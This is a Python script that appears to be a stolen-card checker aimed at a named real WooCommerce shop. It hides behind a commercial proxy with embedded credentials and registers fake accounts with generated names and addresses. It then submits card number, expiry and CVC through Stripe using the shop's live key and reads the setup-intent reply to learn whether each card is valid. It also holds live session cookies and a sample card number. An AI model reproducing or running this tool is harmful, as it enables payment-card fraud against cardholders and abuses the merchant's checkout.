import random
import string
import requests
from user_agent import generate_user_agent
from proxy import reqproxy, make_request
import json
import re

#============================================
def generate_full_name():
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan", "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa", "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha", "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada", "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar", "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia", "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem", "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia", "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"]
    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown", "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White", "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar", "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera", "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza", "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard", "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell", "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"]
    return random.choice(first_names), random.choice(last_names)

def generate_address():
    cities = ["London", "Birmingham", "Manchester", "Liverpool", "Leeds", "Glasgow", "Sheffield", "Edinburgh", "Bristol", "Cardiff"]
    states = ["England", "England", "England", "England", "England", "Scotland", "England", "Scotland", "England", "Wales"]
    streets = ["Baker St", "Oxford St", "High St", "King's Rd", "Abbey Rd", "The Strand", "Regent St", "Whitehall", "Fleet St", "Pall Mall"]
    zip_codes = ["SW1A 1AA", "W1D 3QF", "M1 1AE", "N1C 4AG", "EC1A 1BB", "SE1 8XX", "B1 1AA", "RG1 8DN", "SW1E 5RS", "B2 5DT"]
    
    city = random.choice(cities)
    street_address = f"{random.randint(1, 999)} {random.choice(streets)}"
    zip_code = random.choice(zip_codes)
    return street_address, city, "GB", zip_code, f"07{random.randint(100000000, 999999999)}"

def generate_email():
    return f"user{random.randint(10000,99999)}@example.com"

def generate_username():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))

def generate_random_code(length=32):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

#============================================
def Tele(ccx):
    proxy_str = "brd.superproxy.io:33335:brd-customer-hl_5c664e64-zone-datacenter_proxy1:0bnfn02i83lj"
    session, ip = reqproxy(proxy_str)
    #print(f"IP Address: {ip}")
    ccx=ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:#Mo3gza
        yy = yy.split("20")[1]
    #elif "01" in mm or "02" in mm or "01" in mm or "03" in mm or "04" in mm or "05" in mm or "06" in mm or "07" in mm or "08" in mm or "09" in mm:
        #mm = mm.split("0")[1]

    user = generate_user_agent()
    r = requests.Session()
    r.verify = False
    
    first_name, last_name = generate_full_name()
    kaddress, city, country, postcode, phone =     generate_address()
    kaddress, city, country, postcode, phone = generate_address()
    email = generate_email()
    username = generate_username()
    corr = generate_random_code()
    sess = generate_random_code()
    nr = random.randint(100000, 999999)
    lr = random.randint(1000, 9999)

    headers = {
        'authority': 'littleplumber.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    
    response = session.get('https://littleplumber.com/my-account/add-payment-method/', headers=headers)
    
    register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
    #print(response.text)
    
    cookies = {
        '_ga_G7PZJ0JC8H': 'GS2.1.s1777984267$o1$g0$t1777984267$j60$l0$h0',
        '_ga': 'GA1.2.303953913.1777984268',
        '_gid': 'GA1.2.2046586886.1777984268',
        '_gat_UA-39621671-1': '1',
        'sc_is_visitor_unique': 'rx1356098.1777984268.2E1BA1A3A97742E28FE5560A21CEFC11.1.1.1.1.1.1.1.1.1',
        '_ga_KBFBLV1ZPK': 'GS2.2.s1777984268$o1$g0$t1777984268$j60$l0$h0',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2026-05-05%2012%3A31%3A08%7C%7C%7Cep%3Dhttps%3A%2F%2Flittleplumber.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_first_add': 'fd%3D2026-05-05%2012%3A31%3A08%7C%7C%7Cep%3Dhttps%3A%2F%2Flittleplumber.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
        'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Flittleplumber.com%2Fmy-account%2Fadd-payment-method%2F',
        '_gcl_au': '1.1.966017421.1777984269',
        'woosw_key': 'UN0K7V',
        'twk_idm_key': 'fZowNbGIwsPkSUlJASTvM',
        'TawkConnectionTime': '0',
        'twk_uuid_58078258f434cc6ca455e39c': '%7B%22uuid%22%3A%221.92RHcurtUWhuhrgXqDqRZGYJOaYZeTnP7bPOs1JMJvZEwKh84VXrJAcHPmibyu9S1e1NV3DotmsXMtdxRxXJA4EbMWkDKFNY5hm89k6pMAeF9YU0aGzTII4Ld4Jg%22%2C%22version%22%3A3%2C%22domain%22%3A%22littleplumber.com%22%2C%22ts%22%3A1777984271960%7D',
    }
    
    headers = {
        'authority': 'littleplumber.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': '_ga_G7PZJ0JC8H=GS2.1.s1777984267$o1$g0$t1777984267$j60$l0$h0; _ga=GA1.2.303953913.1777984268; _gid=GA1.2.2046586886.1777984268; _gat_UA-39621671-1=1; sc_is_visitor_unique=rx1356098.1777984268.2E1BA1A3A97742E28FE5560A21CEFC11.1.1.1.1.1.1.1.1.1; _ga_KBFBLV1ZPK=GS2.2.s1777984268$o1$g0$t1777984268$j60$l0$h0; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-05-05%2012%3A31%3A08%7C%7C%7Cep%3Dhttps%3A%2F%2Flittleplumber.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-05-05%2012%3A31%3A08%7C%7C%7Cep%3Dhttps%3A%2F%2Flittleplumber.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Flittleplumber.com%2Fmy-account%2Fadd-payment-method%2F; _gcl_au=1.1.966017421.1777984269; woosw_key=UN0K7V; twk_idm_key=fZowNbGIwsPkSUlJASTvM; TawkConnectionTime=0; twk_uuid_58078258f434cc6ca455e39c=%7B%22uuid%22%3A%221.92RHcurtUWhuhrgXqDqRZGYJOaYZeTnP7bPOs1JMJvZEwKh84VXrJAcHPmibyu9S1e1NV3DotmsXMtdxRxXJA4EbMWkDKFNY5hm89k6pMAeF9YU0aGzTII4Ld4Jg%22%2C%22version%22%3A3%2C%22domain%22%3A%22littleplumber.com%22%2C%22ts%22%3A1777984271960%7D',
        'origin': 'https://littleplumber.com',
        'referer': 'https://littleplumber.com/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    
    data = {
        'email': f'genpaypal{nr}@gmail.com',
        'wc_order_attribution_source_type': 'typein',
        'wc_order_attribution_referrer': '(none)',
        'wc_order_attribution_utm_campaign': '(none)',
        'wc_order_attribution_utm_source': '(direct)',
        'wc_order_attribution_utm_medium': '(none)',
        'wc_order_attribution_utm_content': '(none)',
        'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)',
        'wc_order_attribution_utm_source_platform': '(none)',
        'wc_order_attribution_utm_creative_format': '(none)',
        'wc_order_attribution_utm_marketing_tactic': '(none)',
        'wc_order_attribution_session_entry': 'https://littleplumber.com/my-account/add-payment-method/',
        'wc_order_attribution_session_start_time': '2026-05-05 12:31:08',
        'wc_order_attribution_session_pages': '1',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': user,
        'woocommerce-register-nonce': f'{register}',
        '_wp_http_referer': '/my-account/add-payment-method/',
        'register': 'Register',
    }
    
    response = session.post('https://littleplumber.com/my-account/add-payment-method/', #cookies=cookies, 
    headers=headers, data=data)
    
    ajax = re.search(r'"createSetupIntentNonce":"(.*?)"', response.text).group(1)
    #print(ajax)
    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': user,
    }
    
    data = f'billing_details[name]=+&billing_details[email]=genpaypal{nr}%40gmail.com&billing_details[address][country]=TH&type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2Fea2f4b4e05%3B+stripe-js-v3%2Fea2f4b4e05%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Flittleplumber.com&time_on_page=38078&client_attribution_metadata[client_session_id]=aa2c564b-3d72-477d-a40b-5af1ccb3d821&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_id]=elements_session_1MIOMzg9gNI&client_attribution_metadata[elements_session_config_id]=0d8d5b97-daac-4a5f-a8d9-ee9f2c0cf806&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=af465798-0ff9-4fa2-938d-7172e5e3e8be092091&muid=6b45b5ae-4176-4bc9-9018-a4eac7de9db9a972ff&sid=64702de4-7a64-4ded-9974-75f048a7181aa4c69d&key=pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs&_stripe_account=acct_1QbfJaFjtVwVrTS7'
    
    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    
    pm = response.json()['id']
    #print(response.text)
    
    cookies = {
        'wordpress_sec_59eafea7f032ee9ce16d42752f95b864': 'genpaypal06%7C1779194229%7C77gCKbMCiwOhVoIoJ942Rd4ikLgt87vt6C8s2ilYEdF%7C0f919706a8be45aeab3039073f3ebaf53e4b2643d731c408b1aa86b93d8b4557',
        '_gid': 'GA1.2.1334159907.1777984605',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2026-05-05%2012%3A36%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Flittleplumber.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_first_add': 'fd%3D2026-05-05%2012%3A36%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Flittleplumber.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
        '_gcl_au': '1.1.1010872046.1777984606',
        'woosw_key': 'NQ46VH',
        'twk_idm_key': 'AI6yzJReGNvvxsrMlc8v7',
        'wordpress_logged_in_59eafea7f032ee9ce16d42752f95b864': 'genpaypal06%7C1779194229%7C77gCKbMCiwOhVoIoJ942Rd4ikLgt87vt6C8s2ilYEdF%7C02c0e6ddd92be877da02e84f6b38f8437c968c1133a8346b22aaf9f29ee50e7f',
        'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Flittleplumber.com%2Fmy-account%2Fadd-payment-method%2F%3F_wc_user_reg%3Dtrue',
        '_ga_G7PZJ0JC8H': 'GS2.1.s1777984605$o1$g1$t1777984632$j33$l0$h0',
        'sc_is_visitor_unique': 'rx1356098.1777984633.1C45172CCC344E4CA7CACDAA301D6983.1.1.1.1.1.1.1.1.1',
        '__ssid': 'be7193fd-0dd6-4e43-81d2-2b2513ae7f82',
        '_ga': 'GA1.2.558748693.1777984605',
        '_ga_KBFBLV1ZPK': 'GS2.2.s1777984605$o1$g1$t1777984634$j31$l0$h0',
        'TawkConnectionTime': '0',
        'twk_uuid_58078258f434cc6ca455e39c': '%7B%22uuid%22%3A%221.92RHcyLYi9lyLW8WKKKNz8k3uKSc3JPnjpwxG6DBxor2yng54ODp13PA1FCJ7BYQizRsl5ri0UhXEYEK5ft2Idr1yHWWQazVoehrr5UM4HnXsyvxarQzRKdk4J6C%22%2C%22version%22%3A3%2C%22domain%22%3A%22littleplumber.com%22%2C%22ts%22%3A1777984635363%7D',
        '__stripe_mid': '6b45b5ae-4176-4bc9-9018-a4eac7de9db9a972ff',
        '__stripe_sid': '64702de4-7a64-4ded-9974-75f048a7181aa4c69d',
    }
    
    headers = {
        'authority': 'littleplumber.com',
        'accept': '*/*',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        #'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryccY0ooqYBoKFG3OE',
        # 'cookie': 'wordpress_sec_59eafea7f032ee9ce16d42752f95b864=genpaypal06%7C1779194229%7C77gCKbMCiwOhVoIoJ942Rd4ikLgt87vt6C8s2ilYEdF%7C0f919706a8be45aeab3039073f3ebaf53e4b2643d731c408b1aa86b93d8b4557; _gid=GA1.2.1334159907.1777984605; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-05-05%2012%3A36%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Flittleplumber.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-05-05%2012%3A36%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Flittleplumber.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; _gcl_au=1.1.1010872046.1777984606; woosw_key=NQ46VH; twk_idm_key=AI6yzJReGNvvxsrMlc8v7; wordpress_logged_in_59eafea7f032ee9ce16d42752f95b864=genpaypal06%7C1779194229%7C77gCKbMCiwOhVoIoJ942Rd4ikLgt87vt6C8s2ilYEdF%7C02c0e6ddd92be877da02e84f6b38f8437c968c1133a8346b22aaf9f29ee50e7f; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Flittleplumber.com%2Fmy-account%2Fadd-payment-method%2F%3F_wc_user_reg%3Dtrue; _ga_G7PZJ0JC8H=GS2.1.s1777984605$o1$g1$t1777984632$j33$l0$h0; sc_is_visitor_unique=rx1356098.1777984633.1C45172CCC344E4CA7CACDAA301D6983.1.1.1.1.1.1.1.1.1; __ssid=be7193fd-0dd6-4e43-81d2-2b2513ae7f82; _ga=GA1.2.558748693.1777984605; _ga_KBFBLV1ZPK=GS2.2.s1777984605$o1$g1$t1777984634$j31$l0$h0; TawkConnectionTime=0; twk_uuid_58078258f434cc6ca455e39c=%7B%22uuid%22%3A%221.92RHcyLYi9lyLW8WKKKNz8k3uKSc3JPnjpwxG6DBxor2yng54ODp13PA1FCJ7BYQizRsl5ri0UhXEYEK5ft2Idr1yHWWQazVoehrr5UM4HnXsyvxarQzRKdk4J6C%22%2C%22version%22%3A3%2C%22domain%22%3A%22littleplumber.com%22%2C%22ts%22%3A1777984635363%7D; __stripe_mid=6b45b5ae-4176-4bc9-9018-a4eac7de9db9a972ff; __stripe_sid=64702de4-7a64-4ded-9974-75f048a7181aa4c69d',
        'origin': 'https://littleplumber.com',
        'referer': 'https://littleplumber.com/my-account/add-payment-method/?_wc_user_reg=true',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': user,
    }
    
    files = {
        'action': (None, 'create_setup_intent'),
        'wcpay-payment-method': (None, f'{pm}'),
        '_ajax_nonce': (None, f'{ajax}'),
    }
    
    response = session.post('https://littleplumber.com/wp-admin/admin-ajax.php', #cookies=cookies, 
    headers=headers, files=files)
    try:
        result = re.search(r'"message":"(.*?)"', response.text).group(1)
    except:
        result = re.search(r'"status":"(.*?)"', response.text).group(1)

    return result
    
#test_card = "6011007188815814|11|27|207"
#print(Tele(test_card))